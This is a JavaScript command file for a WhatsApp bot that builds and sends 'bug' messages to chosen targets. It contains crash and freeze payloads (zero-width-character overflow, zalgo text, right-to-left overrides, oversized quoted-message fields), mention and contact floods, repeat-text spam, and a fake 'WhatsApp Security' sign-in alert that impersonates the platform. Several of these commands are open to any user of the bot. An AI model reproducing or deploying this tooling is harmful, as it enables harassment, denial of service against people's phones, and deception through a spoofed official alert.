// Bug commands — crash / annoy tricks.
// Public commands (crash/freeze/ghostping/zalgo/rtlbug/tina): anyone can use,
//   target = the person whose message was replied to.
// Owner-only: blankbug, sysalert, cspam, repeatbug, bugmenu.

import { PREFIX } from '../lib/config.js';
import { bugSend } from '../lib/bugsend.js';

/* ------------------------------------------------------------------ helpers */

function overflowText(repeat = 2000) {
  const ZWJ = '\u200d', ZWNJ = '\u200c';
  return (ZWJ + ZWNJ).repeat(repeat);
}

function zalgoChar(ch) {
  const above = ['\u0300','\u0301','\u0302','\u0303','\u0304','\u0305','\u0306','\u0307','\u0308','\u030a','\u030b','\u030d','\u030e','\u0310','\u0312','\u0313','\u0315','\u031a','\u031b','\u033d','\u033e','\u033f','\u0342','\u0344','\u0346','\u034a','\u034b','\u034c','\u0350','\u0351','\u0352','\u0357','\u0358','\u035b'];
  const below = ['\u0316','\u0317','\u0318','\u0319','\u031c','\u031d','\u031e','\u031f','\u0320','\u0324','\u0325','\u0326','\u0329','\u032a','\u032b','\u032c','\u032d','\u032e','\u032f','\u0330','\u0331','\u0332','\u0333','\u0339','\u033a','\u033b','\u033c','\u0345','\u0347','\u0348','\u0349','\u034d','\u034e','\u0353','\u0354','\u0355','\u0356','\u0359','\u035a','\u035f'];
  const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];
  let out = ch;
  for (let i = 0; i < 15; i++) out += pick(above);
  for (let i = 0; i < 10; i++) out += pick(below);
  return out;
}
function zalgo(text) { return [...text].map(zalgoChar).join(''); }

const RLO = '\u202e', PDF = '\u202c';
function rtlFlip(text) { return RLO + text + PDF; }

function fakeSystem(lines) {
  return ['🔒 *WhatsApp Security*', '━━━━━━━━━━━━━━━━━━━━', ...lines, '━━━━━━━━━━━━━━━━━━━━', '_This is an automated alert from WhatsApp._'].join('\n');
}

function spamContactsPayload(count = 60) {
  return Array.from({ length: count }, (_, i) => {
    const num = `+9477${String(i).padStart(7, '0')}`;
    return { displayName: `Contact ${i}`, vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:Contact ${i}\nTEL;type=CELL;waid=${num.replace('+','')}:${num}\nEND:VCARD` };
  });
}

// Strong crash — broken extendedTextMessage contextInfo
// Renderer tries to look up the zalgo quoted body → chokes / force-closes
function extendedCrashPayload(text = '👋') {
  return {
    extendedTextMessage: {
      text: text + overflowText(500),
      contextInfo: {
        stanzaId: overflowText(1000),
        participant: '0@s.whatsapp.net',
        quotedMessage: { conversation: zalgo(text) + overflowText(800) },
        mentionedJid: Array.from({ length: 20 }, (_, i) => `9477${String(i).padStart(7,'0')}@s.whatsapp.net`),
      }
    }
  };
}

// viewOnce freeze — allocates giant string on message open
function viewOnceFreezePayload() {
  const inner = overflowText(6000) + zalgo('WhatsApp') + overflowText(4000);
  return {
    viewOnceMessage: {
      message: {
        extendedTextMessage: {
          text: inner,
          contextInfo: {
            stanzaId: overflowText(500),
            quotedMessage: { conversation: inner },
          }
        }
      }
    }
  };
}

// Ghost ping — 20 fake @mentions, avatar resolver blocks UI thread
function mentionFloodPayload(text) {
  const fakeJids = Array.from({ length: 20 }, (_, i) => `9477${String(i * 7 + 1).padStart(7,'0')}@s.whatsapp.net`);
  return {
    extendedTextMessage: {
      text: fakeJids.map((j) => `@${j.split('@')[0]}`).join(' ') + '\n' + (text || '') + overflowText(300),
      contextInfo: { mentionedJid: fakeJids }
    }
  };
}

/* ------------------------------------------------------------------ shared runner
   All public bug commands:
     1. Resolve target from reply/mention/number
     2. assertSessions() → establish encryption session (fixes "No sessions")
     3. Send payload quoted on target's own message
     4. Confirm to sender
*/
async function sendBug({ sock, jid, msg, reply, targetJid, payload, label }) {
  const target = targetJid() || jid;

  // The quoted key: if the sender replied to someone, we re-quote that same message
  // so the crash arrives as a reply inside the target's thread.
  const ctx = msg.message?.extendedTextMessage?.contextInfo;
  const quotedOpts = ctx?.stanzaId
    ? { quoted: { key: { remoteJid: jid, id: ctx.stanzaId, participant: ctx.participant || target }, message: { conversation: '' } } }
    : { quoted: msg };

  try {
    // bugSend does assertSessions() + retry → no more "No sessions" errors
    await bugSend(sock, target, payload, quotedOpts);
    await reply(`✅ ${label} → @${target.split('@')[0]}`);
  } catch (err) {
    await reply(`❌ Failed: ${err?.message || err}`);
  }
}

/* ------------------------------------------------------------------ commands */

export default [

  // ── bugmenu ──────────────────────────────────────────────────────────────
  {
    name: 'bugmenu', aliases: ['bughelp', 'bugslist'],
    owner: true,
    async run({ reply }) {
      const p = PREFIX;
      return reply([
        '╭━━━〔 🐛 *BUG COMMANDS* 〕━━━⬣',
        '┃ Reply to target\'s message → type cmd.',
        '┃',
        `┃ 💥 ${p}crash      — context overflow crash`,
        `┃ ❄️  ${p}freeze     — view-once open crash`,
        `┃ 👥 ${p}ghostping  — mention flood lag`,
        `┃ 🌀 ${p}zalgo      — glitch-text render lag`,
        `┃ 🔄 ${p}rtlbug     — BiDi flip crash`,
        `┃ 💔 ${p}tina       — dramatic roast crash`,
        '┃',
        `┃ 👻 ${p}blankbug   — invisible blob     [owner]`,
        `┃ 🔒 ${p}sysalert   — fake system alert  [owner]`,
        `┃ 📇 ${p}cspam      — contact flood      [owner]`,
        `┃ 🔁 ${p}repeatbug  — repeat-text freeze [owner]`,
        `┃ 💣 ${p}gcrash     — group crash        [owner]`,
        '┃',
        `┃ 💡 Reply to msg → ${p}freeze`,
        '╰━━━━━━━━━━━━━━━━━━━━⬣',
      ].join('\n'));
    },
  },

  // ── crash ─────────────────────────────────────────────────────────────────
  {
    name: 'crash', aliases: ['notifbug'],
    owner: false,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const text = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g,''))).join(' ').trim() || '👋';
      await sendBug({ sock, jid, msg, reply, targetJid, payload: extendedCrashPayload(text), label: 'Crash sent' });
    },
  },

  // ── freeze ────────────────────────────────────────────────────────────────
  {
    name: 'freeze', aliases: ['viewoncecrash', 'opencrash'],
    owner: false,
    async run({ sock, jid, msg, reply, targetJid }) {
      await sendBug({ sock, jid, msg, reply, targetJid, payload: viewOnceFreezePayload(), label: 'Freeze sent' });
    },
  },

  // ── ghostping ─────────────────────────────────────────────────────────────
  {
    name: 'ghostping', aliases: ['mentionflood', 'ghostmention'],
    owner: false,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const text = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g,''))).join(' ').trim();
      await sendBug({ sock, jid, msg, reply, targetJid, payload: mentionFloodPayload(text), label: 'Ghost ping sent' });
    },
  },

  // ── zalgo ─────────────────────────────────────────────────────────────────
  {
    name: 'zalgo', aliases: ['glitch', 'cursedtext'],
    owner: false,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const base = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g,''))).join(' ').trim() || 'WhatsApp';
      await sendBug({ sock, jid, msg, reply, targetJid, payload: { text: zalgo(base) }, label: 'Zalgo sent' });
    },
  },

  // ── rtlbug ────────────────────────────────────────────────────────────────
  {
    name: 'rtlbug', aliases: ['rtl', 'fliptext'],
    owner: false,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const base = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g,''))).join(' ').trim() || 'Hello from WhatsApp';
      await sendBug({ sock, jid, msg, reply, targetJid, payload: { text: Array.from({length:10}, () => rtlFlip(base)).join('\n') }, label: 'RTL-bug sent' });
    },
  },

  // ── tina ──────────────────────────────────────────────────────────────────
  {
    name: 'tina', aliases: ['tinabug', 'dramabug'],
    owner: false,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const name = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g,''))).join(' ').trim() || 'Tina';
      const visible = [
        `💔 *${name}*, ඔයා ගැන කතා කරන්නත් කාලය නාස්ති කරන්නේ නෑ.`,
        `ඔය number block list ළ දාලා ඉවරයි 🚫`,
        `WhatsApp uninstall කරන්නම හොඳයි 😂`,
        `RIO-XMD bot ළ ඔයාට space නෑ 👋`,
      ].join('\n');
      await sendBug({ sock, jid, msg, reply, targetJid, payload: extendedCrashPayload(visible), label: 'Tina bug sent' });
    },
  },

  // ── blankbug ──────────────────────────────────────────────────────────────
  {
    name: 'blankbug', aliases: ['nullmsg', 'emptybug'],
    owner: true,
    async run({ sock, jid, msg, reply, targetJid }) {
      const target = targetJid() || jid;
      try {
        await bugSend(sock, target, { text: overflowText(5000) }, { quoted: msg });
        return reply(`✅ Blank-bug sent to @${target.split('@')[0]}`);
      } catch (err) { return reply(`❌ Failed: ${err?.message || err}`); }
    },
  },

  // ── sysalert ──────────────────────────────────────────────────────────────
  {
    name: 'sysalert', aliases: ['fakealert', 'fakesys'],
    owner: true,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const target = targetJid() || jid;
      const custom = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g,''))).join(' ').trim();
      const payload = fakeSystem(custom ? [custom] : ['⚠️ Unusual sign-in activity detected.','Your account may have been accessed','from an unrecognized device.','','Tap *Settings → Linked Devices*','and remove any device you don\'t recognize.']);
      try {
        await bugSend(sock, target, { text: payload }, { quoted: msg });
        return reply(`✅ Fake-alert sent to @${target.split('@')[0]}`);
      } catch (err) { return reply(`❌ Failed: ${err?.message || err}`); }
    },
  },

  // ── cspam ─────────────────────────────────────────────────────────────────
  {
    name: 'cspam', aliases: ['contactspam', 'contactbug'],
    owner: true,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const target = targetJid() || jid;
      const count = Math.min(100, Math.max(1, parseInt(args.find((a) => /^\d+$/.test(a)) || '60', 10)));
      try {
        await bugSend(sock, target, { contacts: { displayName: `${count} Contacts`, contacts: spamContactsPayload(count) } }, { quoted: msg });
        return reply(`✅ ${count} contacts sent to @${target.split('@')[0]}`);
      } catch (err) { return reply(`❌ Failed: ${err?.message || err}`); }
    },
  },

  // ── repeatbug ─────────────────────────────────────────────────────────────
  {
    name: 'repeatbug', aliases: ['repeatcrash', 'spamtext'],
    owner: true,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const target = targetJid() || jid;
      const word = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g,'')) && a.length <= 20).join(' ').trim() || 'ha';
      try {
        await bugSend(sock, target, { text: (word + ' ').repeat(4000).trimEnd() }, { quoted: msg });
        return reply(`✅ Repeat-bug sent to @${target.split('@')[0]}`);
      } catch (err) { return reply(`❌ Failed: ${err?.message || err}`); }
    },
  },
];
